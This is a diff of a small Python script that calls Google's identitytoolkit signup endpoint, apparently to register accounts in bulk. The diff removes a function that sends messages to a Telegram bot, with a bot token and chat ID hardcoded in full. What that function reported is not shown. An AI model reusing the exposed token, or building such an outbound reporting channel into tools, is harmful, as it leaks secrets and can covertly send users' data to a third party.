@@ -1,25 +1,7 @@
+#@gqpgqpg on tele | @oeuc on tik
 import requests, json
 import random
-# threading import removed
 NUM_THREADS = 10
-
-r = '\033[0;31m'
-g = '\033[0;32m'
-
-telegram_token = '5865928935:AAE5bkG5g-A6mi9jXItcsIaeW0KTRW7orQo'
-telegram_chat_id = '5046267899'
-
-def send_to_telegram(message):
-    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
-    payload = {
-        "chat_id": telegram_chat_id,
-        "text": message
-    }
-    headers = {'Content-Type': 'application/json'}
-    try:
-        requests.post(url, data=json.dumps(payload), headers=headers)
-    except requests.RequestException as e:
-        print(f"خطأ أثناء إرسال الرسالة إلى تيليجرام: {e}")
 
 
 url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser"
@@ -57,9 +39,4 @@ if token:
     response = requests.post(url, data=payload, headers=headers)
     response.raise_for_status()
     response_data = response.json()
-    if 'userId' in str(response_data):
-            print(response_data)
-    else:
-            print(response_data)
-else:
-    print("Failed to generate token. Exiting.")
+    print(response_data)
